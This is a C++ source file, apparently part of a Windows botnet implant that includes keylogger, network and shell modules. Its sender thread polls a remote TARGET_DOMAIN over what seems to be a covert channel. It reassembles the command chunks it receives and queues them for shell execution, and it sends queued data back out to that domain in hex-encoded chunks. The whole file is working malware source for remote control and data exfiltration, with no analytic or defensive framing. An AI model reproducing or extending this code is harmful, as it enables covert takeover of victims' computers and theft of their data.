#include "Botnet.h"
#include "KeyLogger.h"
#include "Network.h"
#include "ConsoleClient.h"
#include "Shell.h"
#include <string>

void EnqueueSend(const std::string& s) {
    std::lock_guard<std::mutex> lk(queue_mutex);
    send_queue.push(s);
}

void EnqueueExecute(const std::string& s) {
    std::lock_guard<std::mutex> lk(execute_mutex);
    execute_queue.push(s);
}

DWORD senderBotnetThread(LPVOID lpParam)
{
    while (true) {
        std::vector<std::string> command_chunks;
        size_t chunk_offset = 0;

        while (true)
        {
            int retcode = sendDataTypeP(connectionId, botnet_packetNumber, chunk_offset, TARGET_DOMAIN.c_str());

            if (retcode == 1) {
                std::string chunk_data;
                {
                    std::lock_guard<std::mutex> lock(g_outChunkMutex);

                    int size_needed = WideCharToMultiByte(CP_UTF8, 0, g_outChunk.c_str(), -1, nullptr, 0, nullptr, nullptr);
                    if (size_needed > 0) {
                        std::string temp(size_needed - 1, 0);
                        WideCharToMultiByte(CP_UTF8, 0, g_outChunk.c_str(), -1, &temp[0], size_needed, nullptr, nullptr);
                        chunk_data = temp;
                    }
                }

                if (!chunk_data.empty()) {
                    command_chunks.push_back(chunk_data);
                    chunk_offset++;
                    Sleep(50);
                } else {
                    break;
                }
            } 
            else if (retcode == 0) {
                break;
            } 
            else {
                break;
            }
        }

        botnet_packetNumber++;
        if (botnet_packetNumber > 999) {
            botnet_packetNumber = 0;
        }

        std::string dataToSend;

        if (!command_chunks.empty()) {
            std::string full_command;
            for (const auto& chunk : command_chunks) {
                full_command += chunk;
            }

            #ifdef _DEBUG
            std::cout << "[Command] " << full_command << std::endl;
            #endif

            EnqueueExecute(full_command);
        }

        {
            std::lock_guard<std::mutex> lock(queue_mutex);
            if (!send_queue.empty()) {
                dataToSend = send_queue.front();
                send_queue.pop();
            }
        }

        if (!dataToSend.empty()) {
            size_t offset = 0;
            size_t offset_number = 0;
            const size_t totalLen = dataToSend.size();
            int consecutiveFailures = 0;
            const int MAX_FAILURES = 3;
            
            while (offset < totalLen) {
                size_t chunkLen = std::min<size_t>(max_len, totalLen - offset);
                std::string chunk = dataToSend.substr(offset, chunkLen);
                offset_number = offset / max_len;
                
                std::string chunkHex = convertToHex(chunk.c_str());
                
                int success = sendDataTypeC(connectionId, botnet_packetNumber, offset_number,
                                            TARGET_DOMAIN.c_str(), chunkHex.c_str());

                if (success == 0) {
                    botnet_packetNumber++;
                    if (botnet_packetNumber > 999) {
                        botnet_packetNumber = 0;
                    }

                    offset += chunkLen;
                    consecutiveFailures = 0;
                    Sleep(50);
                } else {
                    consecutiveFailures++;
                    
                    if (consecutiveFailures >= MAX_FAILURES) {
                        botnet_packetNumber++;
                        if (botnet_packetNumber > 999) {
                            botnet_packetNumber = 0;
                        }
                        offset += chunkLen;
                        consecutiveFailures = 0;
                        Sleep(100);
                    } else {
                        Sleep(500);
                    }
                }
            }
        } else {
            Sleep(5000);
        }
    }
    return 0;
}

DWORD handle_botnet(LPVOID lpParam)
{
    ConsoleClient client;
    Shell shell(&client);

    if (!shell.CreateSession()) {
        return 1;
    }

    while (true) {
        std::string commandToExecute;

        {
            std::lock_guard<std::mutex> lock(execute_mutex);
            if (!execute_queue.empty()) {
                commandToExecute = execute_queue.front();
                execute_queue.pop();
            }
        }

        if (!commandToExecute.empty()) {
            shell.ExecuteCommand(commandToExecute);
        } else {
            Sleep(100);
        }
    }

    shell.Dispose();
    return 0;
}